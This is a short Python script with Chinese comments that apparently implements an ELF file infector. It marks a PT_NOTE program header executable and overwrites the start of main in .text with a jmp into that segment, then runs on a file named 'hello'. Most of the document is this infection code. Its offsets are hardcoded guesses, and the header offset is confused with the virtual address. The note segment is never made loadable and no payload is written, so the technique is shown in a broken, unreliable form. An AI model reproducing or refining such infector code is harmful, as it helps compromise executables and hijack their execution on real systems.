import struct

# 修改 PT_NOTE 段的权限，使其可执行
def modify_ptnote_permissions(fd, ph_offset):
    """
    修改 PT_NOTE 段的权限，将其修改为可执行段（R E）
    :param fd: 文件描述符
    :param ph_offset: PT_NOTE 段的程序头表偏移
    """
    fd.seek(ph_offset + 4)  # 偏移 4 字节，定位到 p_flags 字段
    flags = struct.unpack('<I', fd.read(4))[0]
    # 增加执行权限 (0x4 表示可执行)
    new_flags = flags | 0x4
    fd.seek(ph_offset + 4)
    fd.write(struct.pack('<I', new_flags))

# 在 .text 段注入 jmp 指令跳转到 PT_NOTE 段
def inject_jmp_to_ptnote(fd, text_offset, note_vaddr, base_vaddr):
    """
    在 .text 段插入 jmp 指令跳转到 PT_NOTE 段的虚拟地址
    :param fd: 文件描述符
    :param text_offset: .text 段的文件偏移地址
    :param note_vaddr: PT_NOTE 段的虚拟地址
    :param base_vaddr: 基地址（.text 段的虚拟地址）
    """
    fd.seek(text_offset)
    # 计算从 .text 段跳转到 PT_NOTE 段的相对偏移
    jump_offset = note_vaddr - (base_vaddr + 5)  # 5 是 jmp 指令长度
    # 创建 jmp 指令
    jmp_instr = b'\xE9' + struct.pack('<I', jump_offset & 0xFFFFFFFF)
    fd.write(jmp_instr)

def infect_elf(file_path):
    """
    修改 ELF 文件，在 .text 段注入 jmp，并跳转到 PT_NOTE 段
    同时修改 PT_NOTE 段的权限，使其可执行。
    :param file_path: ELF 文件路径
    """
    with open(file_path, 'rb+') as fd:
        # .text 段的偏移和基地址，假设我们要修改 main 函数开头
        text_offset = 0x1175  # .text 段的文件偏移
        text_vaddr = 0x1175  # .text 段的虚拟地址 (假设)

        # PT_NOTE 段的虚拟地址
        note_vaddr = 0x338  # 假设 PT_NOTE 段的虚拟地址
        note_ph_offset = 0x338  # 假设 PT_NOTE 段在程序头表中的偏移

        # 修改 PT_NOTE 段权限为可执行
        modify_ptnote_permissions(fd, note_ph_offset)

        # 在 .text 段插入 jmp 到 PT_NOTE 段
        inject_jmp_to_ptnote(fd, text_offset, note_vaddr, text_vaddr)

# 使用例子
infect_elf('hello')
